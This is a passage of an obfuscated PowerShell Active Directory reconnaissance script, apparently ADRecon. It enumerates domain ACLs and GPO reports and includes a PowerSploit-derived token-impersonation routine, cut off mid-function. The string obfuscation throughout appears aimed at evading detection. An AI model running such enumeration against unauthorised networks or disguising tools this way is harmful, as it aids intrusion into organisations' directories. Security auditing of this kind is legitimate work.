                    ('S-1'+'-5-'+'32'+'-554')  { (('B'+'U'+'ILT'+'INnk0Pre-'+'Windo'+'ws 2000 C'+'om'+'pat'+'ible Acc'+'es'+'s').REPlacE(([ChAr]110+[ChAr]107+[ChAr]48),'\')) }
                    ('S-1-5-3'+'2'+'-555')  { (('B'+'UILT'+'IN{'+'0}Remote '+'Desk'+'to'+'p U'+'ser'+'s')-F  [ChAR]92) }
                    ('S'+'-1-'+'5-32-556')  { (('BUILTINB6ONet'+'work C'+'onf'+'ig'+'u'+'r'+'ation Op'+'erator'+'s')-RePlAce  'B6O',[cHAR]92) }
                    ('S'+'-1'+'-'+'5-32-557')  { (('BUILTI'+'Nw'+'j'+'zI'+'n'+'com'+'ing Fore'+'st '+'Trust '+'Builders').REpLAcE(([cHAr]119+[cHAr]106+[cHAr]122),[strIng][cHAr]92)) }
                    ('S'+'-1-5'+'-3'+'2-558')  { (('BUILTIN6hFPerforma'+'n'+'ce M'+'onitor'+' U'+'s'+'e'+'rs').replacE('6hF',[STriNG][cHAR]92)) }
                    ('S-'+'1'+'-5-32-5'+'59')  { (('BUILTI'+'NqhDPerformance'+' '+'L'+'og'+' '+'Users')-CRePlAcE 'qhD',[cHaR]92) }
                    ('S-1-5-32'+'-56'+'0')  { (('B'+'UI'+'LTIN0lEWind'+'ows Auth'+'o'+'r'+'izat'+'i'+'o'+'n Acce'+'ss '+'Group').RePlace(([CHar]48+[CHar]108+[CHar]69),'\')) }
                    ('S-1-5'+'-'+'32-'+'561')  { (('BUIL'+'TINbN'+'zT'+'ermi'+'na'+'l '+'Server Li'+'cens'+'e'+' '+'Serv'+'e'+'rs')-rEpLaCe'bNz',[cHar]92) }
                    ('S-1-5-3'+'2'+'-562')  { (('BUI'+'LTINp'+'ruDistributed C'+'OM Us'+'e'+'rs')  -rEPLACE([ChaR]112+[ChaR]114+[ChaR]117),[ChaR]92) }
                    ('S'+'-1-5-'+'32-569')  { (('BUILTIN{0}'+'Cry'+'ptogra'+'phi'+'c Op'+'erators') -f  [cHaR]92) }
                    ('S'+'-1-5-32'+'-57'+'3')  { (('BUI'+'LTI'+'N{0}Even'+'t Log'+' Re'+'aders') -F [chAr]92) }
                    ('S-'+'1-5-32-5'+'7'+'4')  { (('BUIL'+'TINMT'+'JCerti'+'fi'+'c'+'a'+'te Servi'+'ce'+' '+'DC'+'O'+'M A'+'ccess')  -CRePLace([cHAR]77+[cHAR]84+[cHAR]74),[cHAR]92) }
                    ('S-1-5-3'+'2'+'-57'+'5')  { (('BUILTINIGMRDS'+' Remote '+'A'+'cc'+'ess'+' '+'Servers').REpLACe(([cHar]73+[cHar]71+[cHar]77),[StRinG][cHar]92)) }
                    ('S-'+'1-5-32'+'-576')  { (('BU'+'ILTIN{'+'0}R'+'DS'+' '+'Endpoint Serv'+'er'+'s') -f  [char]92) }
                    ('S-1-'+'5-'+'32-'+'577')  { (('BU'+'IL'+'TIN9m8'+'R'+'DS '+'Managemen'+'t'+' Se'+'rvers').rEplace(([ChAr]57+[ChAr]109+[ChAr]56),[StRiNg][ChAr]92)) }
                    ('S-1-'+'5-32-5'+'7'+'8')  { (('BUI'+'LTINvw3Hyp'+'er-'+'V Adminis'+'tra'+'tors')  -rePLacE ([Char]118+[Char]119+[Char]51),[Char]92) }
                    ('S-1'+'-5-32'+'-5'+'79')  { (('BU'+'ILTI'+'N5'+'1a'+'Acc'+'ess'+' Co'+'nt'+'ro'+'l Ass'+'i'+'stance Op'+'erato'+'rs').rePLAce(([CHaR]53+[CHaR]49+[CHaR]97),[striNg][CHaR]92)) }
                    ('S-'+'1-5-32-'+'580')  { (('BUILTINF6g'+'Rem'+'ote'+' Manag'+'em'+'ent User'+'s') -rEPLAce'F6g',[chAR]92) }
                    Default {
                        # based on Convert-ADName function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
                        If ( ($TargetSid -match ('^S-1-'+'.*')) -and ($ResolveSID) )
                        {
                            If ($Method -eq ('ADW'+'S'))
                            {
                                Try
                                {
                                    $ADObject = Get-ADObject -Filter ('ob'+'j'+'ectSid '+'-e'+'q '+"'$TargetSid'") -Properties DistinguishedName,sAMAccountName
                                }
                                Catch
                                {
                                    Write-Warning ('[C'+'onve'+'rtFro'+'m-SID'+'] Err'+'or while '+'e'+'numer'+'ating Object'+' usin'+'g SID')
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                                }
                                If ($ADObject)
                                {
                                    $UserDomain = Get-DNtoFQDN -ADObjectDN $ADObject.DistinguishedName
                                    $ADSOutput = $UserDomain + "\" + $ADObject.sAMAccountName
                                    Remove-Variable UserDomain
                                }
                            }

                            If ($Method -eq ('L'+'DAP'))
                            {
                                If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                                {
                                    $ADObject = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainFQDN/<SID=$TargetSid>",($Credential.GetNetworkCredential()).UserName,($Credential.GetNetworkCredential()).Password)
                                }
                                Else
                                {
                                    $ADObject = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainFQDN/<SID=$TargetSid>")
                                }
                                If ($ADObject)
                                {
                                    If (-Not ([string]::IsNullOrEmpty($ADObject.Properties.samaccountname)) )
                                    {
                                        $UserDomain = Get-DNtoFQDN -ADObjectDN $([string] ($ADObject.Properties.distinguishedname))
                                        $ADSOutput = $UserDomain + "\" + $([string] ($ADObject.Properties.samaccountname))
                                        Remove-Variable UserDomain
                                    }
                                }
                            }

                            If ( (-Not $ADSOutput) -or ([string]::IsNullOrEmpty($ADSOutput)) )
                            {
                                $ADSOutputType = $ADS_NAME_TYPE_NT4
                                $Init = $true
                                $Translate = New-Object -ComObject NameTranslate
                                If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                                {
                                    $ADSInitType = $ADS_NAME_INITTYPE_DOMAIN
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(('I'+'nitEx'),('Inv'+'okeMeth'+'od'),$null,$Translate,$(@($ADSInitType,$DomainFQDN,($Credential.GetNetworkCredential()).UserName,$DomainFQDN,($Credential.GetNetworkCredential()).Password)))
                                    }
                                    Catch
                                    {
                                        $Init = $false
                                        #Write-Verbose "[ConvertFrom-SID] Error initializing translation for $($TargetSid) using alternate credentials"
                                        #Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                    }
                                }
                                Else
                                {
                                    $ADSInitType = $ADS_NAME_INITTYPE_GC
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(('Ini'+'t'),('Invok'+'e'+'Metho'+'d'),$null,$Translate,($ADSInitType,$null))
                                    }
                                    Catch
                                    {
                                        $Init = $false
                                        #Write-Verbose "[ConvertFrom-SID] Error initializing translation for $($TargetSid)"
                                        #Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                    }
                                }
                                If ($Init)
                                {
                                    [System.__ComObject].InvokeMember(('C'+'haseR'+'eferral'),('S'+'etPro'+'p'+'erty'),$null,$Translate,$ADS_CHASE_REFERRALS_ALWAYS)
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(('Se'+'t'),('I'+'nvokeMe'+'th'+'od'),$null,$Translate,($ADS_NAME_TYPE_UNKNOWN, $TargetSID))
                                        $ADSOutput = [System.__ComObject].InvokeMember(('G'+'et'),('In'+'vok'+'eMeth'+'od'),$null,$Translate,$ADSOutputType)
                                    }
                                    Catch
                                    {
                                        #Write-Verbose "[ConvertFrom-SID] Error translating $($TargetSid)"
                                        #Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                    }
                                }
                            }
                        }
                        If (-Not ([string]::IsNullOrEmpty($ADSOutput)) )
                        {
                            Return $ADSOutput
                        }
                        Else
                        {
                            Return $TargetSid
                        }
                    }
                }
            }
            Catch
            {
                #Write-Output "[ConvertFrom-SID] Error converting SID $($TargetSid)"
                #Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
        }
        Else
        {
            Return $TargetSid
        }
    }
}

# based on https://gallery.technet.microsoft.com/Active-Directory-OU-1d09f989
Function Get-ADRACL
{
<#
.SYNOPSIS
    Returns all ACLs for the Domain, OUs, Root Containers, GPO, User, Computer and Group objects in the current (or specified) domain.

.DESCRIPTION
    Returns all ACLs for the Domain, OUs, Root Containers, GPO, User, Computer and Group objects in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER ResolveSIDs
    [bool]
    Whether to resolve SIDs in the ACLs module. (Default False)

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.

.LINK
    https://gallery.technet.microsoft.com/Active-Directory-OU-1d09f989
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false)]
        [bool] $ResolveSID = $false,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ('A'+'DWS'))
    {
        If ($Credential -eq [Management.Automation.PSCredential]::Empty)
        {
            If (Test-Path AD:)
            {
                Set-Location AD:
            }
            Else
            {
                Write-Warning ('Defa'+'ult'+' AD'+' '+'dr'+'i'+'ve'+' no'+'t '+'fo'+'und .'+'..'+' S'+'kipping'+' ACL e'+'numeration')
                Return $null
            }
        }
        $GUIDs = @{('00'+'0'+'00000-00'+'0'+'0-'+'0000-000'+'0-0000000'+'0000'+'0') = ('Al'+'l')}
        Try
        {
            Write-Verbose ('['+'*] Enumer'+'a'+'ting '+'schemaIDs')
            $schemaIDs = Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -LDAPFilter ('('+'sch'+'e'+'maIDGUI'+'D=*)') -Properties name, schemaIDGUID
        }
        Catch
        {
            Write-Warning ('[Get-ADR'+'AC'+'L'+'] Err'+'or '+'w'+'h'+'ile en'+'um'+'erating'+' schemaIDs')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        If ($schemaIDs)
        {
            $schemaIDs | Where-Object {$_} | ForEach-Object {
                # convert the GUID
                $GUIDs[(New-Object Guid (,$_.schemaIDGUID)).Guid] = $_.name
            }
            Remove-Variable schemaIDs
        }

        Try
        {
            Write-Verbose ('[*]'+' '+'Enum'+'erat'+'ing '+'A'+'ctive Direct'+'o'+'ry '+'Rig'+'hts')
            $schemaIDs = Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ('(objectCla'+'ss=cont'+'r'+'o'+'lAcce'+'ssR'+'ig'+'ht)') -Properties name, rightsGUID
        }
        Catch
        {
            Write-Warning ('['+'Get-'+'ADRACL] '+'Error'+' whi'+'le en'+'um'+'era'+'tin'+'g Ac'+'ti'+'ve Di'+'recto'+'ry Ri'+'ghts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        If ($schemaIDs)
        {
            $schemaIDs | Where-Object {$_} | ForEach-Object {
                # convert the GUID
                $GUIDs[(New-Object Guid (,$_.rightsGUID)).Guid] = $_.name
            }
            Remove-Variable schemaIDs
        }

        # Get the DistinguishedNames of Domain, OUs, Root Containers and GroupPolicy objects.
        $Objs = @()
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ('[Get-ADRACL'+'] '+'Err'+'or getti'+'ng Domain'+' '+'Con'+'te'+'xt')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        Try
        {
            Write-Verbose ('[*] '+'Enumerat'+'i'+'ng '+'Do'+'mai'+'n, O'+'U, GPO'+', '+'U'+'se'+'r, Com'+'pu'+'ter and Gro'+'up '+'Obj'+'ec'+'ts')
            $Objs += Get-ADObject -LDAPFilter (('({0'+'}('+'o'+'b'+'jectC'+'lass='+'dom'+'a'+'in)(o'+'bjectCategor'+'y'+'='+'o'+'rga'+'nizatio'+'nal'+'u'+'nit'+')(objectC'+'ateg'+'o'+'ry=gr'+'o'+'u'+'p'+'Polic'+'yContai'+'ner'+')'+'(samAc'+'co'+'untTy'+'pe='+'805'+'3'+'06368'+')'+'(samAccountTyp'+'e'+'=805'+'306369)('+'s'+'am'+'acc'+'oun'+'tt'+'yp'+'e='+'26'+'8'+'43'+'5'+'456)(sa'+'m'+'acc'+'ountty'+'pe=26843'+'5457)(sama'+'c'+'counttype=5368'+'709'+'12'+')'+'(sa'+'maccountt'+'ype=536'+'87'+'0913)'+')')-f [CHAR]124) -Properties DisplayName, DistinguishedName, Name, ntsecuritydescriptor, ObjectClass, objectsid
        }
        Catch
        {
            Write-Warning ('[Ge'+'t-A'+'DRA'+'C'+'L] Error while enume'+'ratin'+'g '+'D'+'o'+'ma'+'in,'+' OU'+','+' GP'+'O, User, Comp'+'uter '+'a'+'n'+'d G'+'r'+'oup Objects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        If ($ADDomain)
        {
            Try
            {
                Write-Verbose ('[*'+'] E'+'n'+'umera'+'t'+'ing R'+'oot Co'+'n'+'t'+'aine'+'r Objects')
                $Objs += Get-ADObject -SearchBase $($ADDomain.DistinguishedName) -SearchScope OneLevel -LDAPFilter ('('+'o'+'bje'+'ct'+'C'+'lass=container)') -Properties DistinguishedName, Name, ntsecuritydescriptor, ObjectClass
            }
            Catch
            {
                Write-Warning ('[Get-ADRACL'+'] Error'+' '+'wh'+'i'+'le e'+'numeratin'+'g Ro'+'ot Cont'+'ainer '+'Objects')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }

        If ($Objs)
        {
            $ACLObj = @()
            Write-Verbose "[*] Total Objects: $([ADRecon.ADWSClass]::ObjectCount($Objs)) "
            Write-Verbose ('[-] DA'+'CLs')
            $DACLObj = [ADRecon.ADWSClass]::DACLParser($Objs, $GUIDs, $Threads)
            #Write-Verbose "[-] SACLs - May need a Privileged Account"
            Write-Warning ('[*'+'] SACL'+'s '+'- Cur'+'r'+'en'+'t'+'ly, the mo'+'d'+'ule'+' is only '+'suppo'+'rte'+'d w'+'ith'+' '+'LDAP'+'.')
            #$SACLObj = [ADRecon.ADWSClass]::SACLParser($Objs, $GUIDs, $Threads)
            Remove-Variable Objs
            Remove-Variable GUIDs
        }
    }

    If ($Method -eq ('LDA'+'P'))
    {
        $GUIDs = @{('0'+'0000000-0000-0'+'000-0'+'000'+'-0'+'0000'+'00'+'00000') = ('Al'+'l')}

        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(('Doma'+'i'+'n'),$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning ('[Ge'+'t-ADR'+'ACL] '+'Error '+'getting Do'+'m'+'ain Conte'+'xt')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(('For'+'est'),$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
                $SchemaPath = $ADForest.Schema.Name
                Remove-Variable ADForest
            }
            Catch
            {
                Write-Warning ('[Get-A'+'DRACL] Error enum'+'era'+'t'+'i'+'ng S'+'chemaP'+'ath')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            $SchemaPath = $ADForest.Schema.Name
            Remove-Variable ADForest
        }

        If ($SchemaPath)
        {
            Write-Verbose ('['+'*] Enume'+'rat'+'ing sc'+'hemaIDs')
            If ($Credential -ne [Management.Automation.PSCredential]::Empty)
            {
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SchemaPath)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
            }
            Else
            {
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher ([ADSI] "LDAP://$($SchemaPath)")
            }
            $objSearcherPath.PageSize = $PageSize
            $objSearcherPath.filter = ('(sc'+'he'+'maIDGUID=*'+')')

            Try
            {
                $SchemaSearcher = $objSearcherPath.FindAll()
            }
            Catch
            {
                Write-Warning ('[Get'+'-'+'AD'+'RACL] '+'Error en'+'um'+'era'+'ting Sch'+'e'+'maIDs')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            If ($SchemaSearcher)
            {
                $SchemaSearcher | Where-Object {$_} | ForEach-Object {
                    # convert the GUID
                    $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
                }
                $SchemaSearcher.dispose()
            }
            $objSearcherPath.dispose()

            Write-Verbose ('[*]'+' '+'E'+'numerating '+'Act'+'iv'+'e Directo'+'ry'+' R'+'ig'+'hts')
            If ($Credential -ne [Management.Automation.PSCredential]::Empty)
            {
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry (("LDAP://$($DomainController)/$($SchemaPath.replace("Schema","Extended-Rights"))")), $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
            }
            Else
            {
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher ([ADSI] (("LDAP://$($SchemaPath.replace("Schema","Extended-Rights"))")))
            }
            $objSearcherPath.PageSize = $PageSize
            $objSearcherPath.filter = ('(ob'+'jec'+'tClass=c'+'o'+'n'+'tr'+'olAcc'+'e'+'ssR'+'ight)')

            Try
            {
                $RightsSearcher = $objSearcherPath.FindAll()
            }
            Catch
            {
                Write-Warning ('[G'+'et-ADRACL'+']'+' Erro'+'r enu'+'m'+'er'+'ating Acti'+'ve'+' Dir'+'ect'+'or'+'y Righ'+'ts')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            If ($RightsSearcher)
            {
                $RightsSearcher | Where-Object {$_} | ForEach-Object {
                    # convert the GUID
                    $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
                }
                $RightsSearcher.dispose()
            }
            $objSearcherPath.dispose()
        }

        # Get the Domain, OUs, Root Containers, GPO, User, Computer and Group objects.
        $Objs = @()
        Write-Verbose ('[*] '+'E'+'n'+'u'+'m'+'erating'+' '+'Dom'+'a'+'in, OU, GPO,'+' U'+'ser'+','+' Comp'+'uter an'+'d '+'Group'+' '+'Ob'+'jects')
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = (('(yXI(o'+'bje'+'ctCl'+'ass=do'+'main)('+'o'+'bjec'+'tCategory='+'or'+'ganiza'+'t'+'ional'+'u'+'nit)(object'+'C'+'a'+'tego'+'ry=gro'+'upPo'+'l'+'i'+'c'+'yCon'+'tainer)('+'samAccoun'+'tTy'+'pe=805306368'+')('+'sa'+'m'+'A'+'c'+'c'+'ountTy'+'pe=8053063'+'69)'+'('+'sama'+'ccou'+'ntt'+'yp'+'e='+'2'+'6'+'84'+'35'+'456'+')('+'s'+'am'+'accounttype'+'='+'2'+'68'+'435457)(s'+'amacc'+'ount'+'t'+'ype'+'=53'+'687'+'091'+'2)(s'+'a'+'ma'+'c'+'c'+'ounttype=536870'+'913)'+')')-CrePlACE ([CHAr]121+[CHAr]88+[CHAr]73),[CHAr]124)
        # https://msdn.microsoft.com/en-us/library/system.directoryservices.securitymasks(v=vs.110).aspx
        $ObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Group -bor [System.DirectoryServices.SecurityMasks]::Owner -bor [System.DirectoryServices.SecurityMasks]::Sacl
        $ObjSearcher.PropertiesToLoad.AddRange((('dis'+'pla'+'ynam'+'e'),('d'+'isti'+'ngu'+'ishedname'),('nam'+'e'),('ntsecuri'+'tydescr'+'i'+'pto'+'r'),('o'+'bj'+'e'+'ctclass'),('o'+'bjectsid')))
        $ObjSearcher.SearchScope = ('Subtre'+'e')

        Try
        {
            $Objs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('['+'G'+'et-ADRACL]'+' Error w'+'hile en'+'u'+'merati'+'ng Dom'+'ai'+'n,'+' OU, G'+'PO, '+'Us'+'e'+'r, Co'+'m'+'puter an'+'d Gr'+'o'+'up'+' Obje'+'cts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $ObjSearcher.dispose()

        Write-Verbose ('[*] E'+'n'+'umer'+'atin'+'g R'+'o'+'o'+'t '+'Contain'+'er'+' Objects')
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ('(objectC'+'l'+'as'+'s='+'co'+'nta'+'iner)')
        # https://msdn.microsoft.com/en-us/library/system.directoryservices.securitymasks(v=vs.110).aspx
        $ObjSearcher.SecurityMasks = $ObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Group -bor [System.DirectoryServices.SecurityMasks]::Owner -bor [System.DirectoryServices.SecurityMasks]::Sacl
        $ObjSearcher.PropertiesToLoad.AddRange((('disting'+'u'+'ish'+'edname'),('na'+'me'),('n'+'tsecuri'+'tyd'+'escrip'+'t'+'or'),('obj'+'e'+'ctclass')))
        $ObjSearcher.SearchScope = ('OneLe'+'ve'+'l')

        Try
        {
            $Objs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[G'+'et-ADRAC'+'L] Err'+'or whi'+'le '+'e'+'num'+'era'+'tin'+'g Root Co'+'n'+'t'+'ain'+'e'+'r O'+'bj'+'e'+'cts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $ObjSearcher.dispose()

        If ($Objs)
        {
            Write-Verbose "[*] Total Objects: $([ADRecon.LDAPClass]::ObjectCount($Objs)) "
            Write-Verbose ('[-]'+' '+'DACLs')
            $DACLObj = [ADRecon.LDAPClass]::DACLParser($Objs, $GUIDs, $Threads)
            Write-Verbose ('[-'+'] SACL'+'s'+' '+'- May'+' '+'ne'+'ed a Pri'+'vil'+'eged Accoun'+'t')
            $SACLObj = [ADRecon.LDAPClass]::SACLParser($Objs, $GUIDs, $Threads)
            Remove-Variable Objs
            Remove-Variable GUIDs
        }
    }

    If ($DACLObj)
    {
        Export-ADR $DACLObj $ADROutputDir $OutputType ('DA'+'CLs')
        Remove-Variable DACLObj
    }

    If ($SACLObj)
    {
        Export-ADR $SACLObj $ADROutputDir $OutputType ('SACL'+'s')
        Remove-Variable SACLObj
    }
}

Function Get-ADRGPOReport
{
<#
.SYNOPSIS
    Runs the Get-GPOReport cmdlet if available.

.DESCRIPTION
    Runs the Get-GPOReport cmdlet if available and saves in HTML and XML formats.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER UseAltCreds
    [bool]
    Whether to use provided credentials or not.

.PARAMETER ADROutputDir
    [string]
    Path for ADRecon output folder.

.OUTPUTS
    HTML and XML GPOReports are created in the folder specified.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $true)]
        [bool] $UseAltCreds,

        [Parameter(Mandatory = $true)]
        [string] $ADROutputDir
    )

    If ($Method -eq ('A'+'DWS'))
    {
        Try
        {
            # Suppress verbose output on module import
            $SaveVerbosePreference = $script:VerbosePreference
            $script:VerbosePreference = ('Silent'+'lyCon'+'t'+'inue')
            Import-Module GroupPolicy -WarningAction Stop -ErrorAction Stop | Out-Null
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
        }
        Catch
        {
            Write-Warning ('['+'G'+'et-ADR'+'G'+'PORe'+'port] Err'+'o'+'r'+' imp'+'orting the GroupP'+'o'+'licy Module. Ski'+'p'+'pin'+'g'+' G'+'PORe'+'port')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
            Return $null
        }
        Try
        {
            Write-Verbose ('['+'*] GPORep'+'or'+'t '+'XML')
            $ADFileName = -join($ADROutputDir,'\',('GPO-R'+'epor'+'t'),('.xm'+'l'))
            Get-GPOReport -All -ReportType XML -Path $ADFileName
        }
        Catch
        {
            If ($UseAltCreds)
            {
                Write-Warning ('[*] '+'Ru'+'n the t'+'o'+'ol usin'+'g '+'R'+'UNA'+'S.')
                Write-Warning (('[*]'+' ru'+'n'+'as /'+'u'+'ser:<Do'+'main FQDN>'+'dav<Username'+'> /neto'+'nly po'+'we'+'r'+'shell.exe')  -RepLAce([chaR]100+[chaR]97+[chaR]118),[chaR]92)
                Return $null
            }
            Write-Warning ('['+'G'+'et-AD'+'RGPORe'+'port'+']'+' '+'Err'+'or getting the '+'GPORe'+'port in XML')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        Try
        {
            Write-Verbose ('[*] '+'G'+'PORe'+'port '+'HTML')
            $ADFileName = -join($ADROutputDir,'\',('GPO-'+'Rep'+'ort'),('.ht'+'ml'))
            Get-GPOReport -All -ReportType HTML -Path $ADFileName
        }
        Catch
        {
            If ($UseAltCreds)
            {
                Write-Warning ('[*'+']'+' Run'+' t'+'he too'+'l us'+'ing RU'+'NA'+'S.')
                Write-Warning (('[*] runas /user'+':<Doma'+'in'+' '+'F'+'QD'+'N'+'>cvG<User'+'name>'+' /netonly p'+'ower'+'s'+'hell.exe').RePLAce(([CHar]99+[CHar]118+[CHar]71),'\'))
                Return $null
            }
            Write-Warning ('['+'Get'+'-ADRGPOR'+'eport] E'+'rror'+' getting'+' the G'+'PORe'+'p'+'ort'+' in X'+'ML')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
    }
    If ($Method -eq ('LDA'+'P'))
    {
        Write-Warning ('['+'*] C'+'ur'+'ren'+'t'+'ly, th'+'e '+'mod'+'ule is onl'+'y suppo'+'rted'+' wi'+'t'+'h '+'A'+'DWS.')
    }
}

# Modified Invoke-UserImpersonation function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Get-ADRUserImpersonation
{
<#
.SYNOPSIS

Creates a new "runas /netonly" type logon and impersonates the token.

Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: PSReflect

.DESCRIPTION

This function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType
to simulate "runas /netonly". The resulting token is then impersonated with
ImpersonateLoggedOnUser() and the token handle is returned for later usage
with Invoke-RevertToSelf.

.PARAMETER Credential

A [Management.Automation.PSCredential] object with alternate credentials
to impersonate in the current thread space.

.PARAMETER TokenHandle

An IntPtr TokenHandle returned by a previous Invoke-UserImpersonation.
If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()
is executed.

.PARAMETER Quiet

Suppress any warnings about STA vs MTA.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred

.OUTPUTS

IntPtr

The TokenHandle result from LogonUser.
#>

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = {'C'+'re'+'dential'})]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = "cre`DeNTi`Al")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = "t`OK`enHan`dLe")]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    If (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne ('ST'+'A')) -and (-not $PSBoundParameters[('Quie'+'t')]))
    {
        Write-Warning ('[Get-ADR'+'UserImpersonation]'+' '+'po'+'wersh'+'el'+'l.exe '+'is not currently in a single-'+'th'+'read'+'ed '+'apartme'+'nt state, '+'token imper'+'s'+'o'+'nation m'+'ay'+' '+'not'+' work.')
    }

    If ($PSBoundParameters[('Toke'+'n'+'Hand'+'le')])
    {
        $LogonTokenHandle = $TokenHandle
    }
    Else
    {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        If (-Not $UserDomain)
        {
            Write-Warning (('['+'G'+'et-ADRU'+'ser'+'Impersona'+'t'+'ion]'+' Us'+'e cred'+'e'+'ntia'+'l'+' with '+'D'+'o'+'m'+'ain '+'FQ'+'DN.'+' '+'(<Doma'+'in FQD'+'N'+'>'+'w4v<User'+'name'+'>)')  -CRePlAce  'w4v',[cHAR]92)
        }
        $UserName = $NetworkCredential.UserName
